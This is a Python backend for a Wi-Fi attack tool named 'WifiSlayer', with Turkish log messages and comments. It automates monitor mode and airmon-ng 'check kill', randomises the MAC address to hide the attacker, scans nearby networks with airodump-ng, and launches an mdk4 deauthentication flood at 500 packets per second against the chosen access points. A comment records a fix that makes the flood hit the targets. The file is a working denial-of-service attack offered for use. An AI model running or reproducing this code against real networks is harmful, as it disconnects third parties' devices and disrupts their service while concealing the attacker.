import os
import subprocess
import csv
import shutil

def log(msg):
    print(msg, flush=True)

class WifiSlayerBackend:
    def __init__(self):
        self.monitor_interface = None
        self.scan_file_prefix  = "temp_scan"
        self.target_list_file  = "targets.txt"
        self.scan_process      = None
        self.attack_process    = None

    def _find_tool(self, name):
        path = shutil.which(name)
        if path:
            return path
        for candidate in [f"/usr/bin/{name}", f"/usr/local/bin/{name}",
                          f"/sbin/{name}",     f"/usr/sbin/{name}"]:
            if os.path.isfile(candidate):
                return candidate
        log(f"[!] UYARI: '{name}' bulunamadı! (apt install {name})")
        return name

    def get_wireless_interfaces(self):
        interfaces = []
        try:
            for iface in os.listdir('/sys/class/net/'):
                if os.path.exists(f'/sys/class/net/{iface}/wireless'):
                    interfaces.append(iface)
        except Exception as e:
            log(f"[!] Arayüz listesi alınamadı: {e}")
        log(f"[*] Kablosuz arayüzler: {interfaces}")
        return interfaces

    def disable_current_monitor(self):
        if self.monitor_interface:
            log(f"[*] Monitor kapatılıyor: {self.monitor_interface}")
            airmon = self._find_tool("airmon-ng")
            subprocess.run(["sudo", airmon, "stop", self.monitor_interface])
            self.monitor_interface = None

    def setup_interface(self, interface):
        if self.monitor_interface in (interface, f"{interface}mon"):
            log(f"[*] Zaten monitor modda: {self.monitor_interface}")
            return self.monitor_interface

        if self.monitor_interface:
            self.disable_current_monitor()

        log(f"\n{'='*50}")
        log(f"[*] Arayüz kuruluyor: {interface}")

        airmon = self._find_tool("airmon-ng")
        log("[*] Çakışan süreçler kapatılıyor (airmon-ng check kill)...")
        subprocess.run(["sudo", airmon, "check", "kill"])

        log("[*] Monitor mod başlatılıyor...")
        subprocess.run(["sudo", airmon, "start", interface])

        expected = f"{interface}mon"
        if expected in os.listdir('/sys/class/net/'):
            self.monitor_interface = expected
        else:
            self.monitor_interface = interface
        log(f"[*] Monitor arayüz: {self.monitor_interface}")

        log("[*] MAC adresi değiştiriliyor (macchanger -r)...")
        subprocess.run(["sudo", "ifconfig", self.monitor_interface, "down"])
        subprocess.run(["sudo", "macchanger", "-r", self.monitor_interface])
        subprocess.run(["sudo", "ifconfig", self.monitor_interface, "up"])

        log(f"[*] Hazır: {self.monitor_interface}")
        log(f"{'='*50}\n")
        return self.monitor_interface

    def start_scan(self):
        if not self.monitor_interface:
            raise ValueError("Monitor mod arayüzü seçilmedi.")
        self._cleanup_files()
        airodump = self._find_tool("airodump-ng")
        cmd = ["sudo", airodump,
               "--band", "ab",
               "--write", self.scan_file_prefix,
               "--output-format", "csv",
               self.monitor_interface]
        log(f"[*] Tarama başlatılıyor: {' '.join(cmd)}")
        self.scan_process = subprocess.Popen(
            cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        log(f"[*] Tarama PID: {self.scan_process.pid}")

    def stop_scan(self):
        if self.scan_process:
            log(f"[*] Tarama durduruluyor (PID {self.scan_process.pid})")
            self.scan_process.terminate()
            self.scan_process.wait()
            self.scan_process = None

    def get_live_targets(self):
        csv_file = f"{self.scan_file_prefix}-01.csv"
        targets  = []
        if not os.path.exists(csv_file):
            return targets
        try:
            with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
                for row in csv.reader(f):
                    if len(row) > 0 and row[0].strip() == "Station MAC":
                        break
                    if len(row) >= 14 and ":" in row[0]:
                        essid = row[13].strip()
                        if not essid or essid.startswith("\\x00") or essid.startswith("\x00"):
                            continue
                        targets.append({
                            "bssid":   row[0].strip(),
                            "channel": row[3].strip(),
                            "essid":   essid
                        })
        except Exception as e:
            log(f"[!] CSV okuma hatası: {e}")
        return targets

    def start_attack(self, bssids, channels):
        if not self.monitor_interface:
            log("[!] Monitor arayüz yok.")
            return False

        mdk4 = self._find_tool("mdk4")

        # Hedefleri dosyaya yaz
        with open(self.target_list_file, "w") as f:
            for mac in bssids:
                f.write(mac + "\n")

        unique_channels = sorted(set(channels), key=lambda c: int(c) if c.isdigit() else 0)
        channel_str = ",".join(unique_channels)

        # -b = blacklist = BUNLARA saldır (hedef listesi)
        # -w = whitelist = bunlara saldırma (korunan liste) — YANLIŞ FLAG BUYDU
        cmd = [
            "sudo", mdk4,
            self.monitor_interface, "d",
            "-b", self.target_list_file,
            "-c", channel_str,
            "-s", "500"              # saniyede 500 paket — çok düşükse etkisiz olur
        ]

        log(f"\n{'='*50}")
        log(f"[*] SALDIRI BAŞLATILIYOR  —  mdk4 deauth")
        log(f"[*] mdk4 yolu    : {mdk4}")
        log(f"[*] Arayüz       : {self.monitor_interface}")
        log(f"[*] Hedef sayısı : {len(bssids)}")
        log(f"[*] Hedefler     : {bssids}")
        log(f"[*] Kanallar     : {channel_str}")
        log(f"[*] Komut        : {' '.join(cmd)}")
        log(f"{'='*50}\n")

        self.attack_process = subprocess.Popen(cmd)
        log(f"[*] mdk4 PID: {self.attack_process.pid}")
        return True

    def stop_attack(self):
        if self.attack_process:
            log(f"[*] Saldırı durduruluyor (PID {self.attack_process.pid})")
            self.attack_process.terminate()
            self.attack_process.wait()
            self.attack_process = None
            log("[*] Saldırı durduruldu.")

    def cleanup(self):
        log("[*] Temizlik başlıyor...")
        self.stop_scan()
        self.stop_attack()
        self.disable_current_monitor()
        log("[*] NetworkManager yeniden başlatılıyor...")
        subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self._cleanup_files()
        log("[*] Temizlik tamamlandı.")

    def _cleanup_files(self):
        for f in os.listdir("."):
            if f.startswith(self.scan_file_prefix) or f == self.target_list_file:
                try:
                    os.remove(f)
                    log(f"[*] Silindi: {f}")
                except OSError as e:
                    log(f"[!] Silinemedi {f}: {e}")
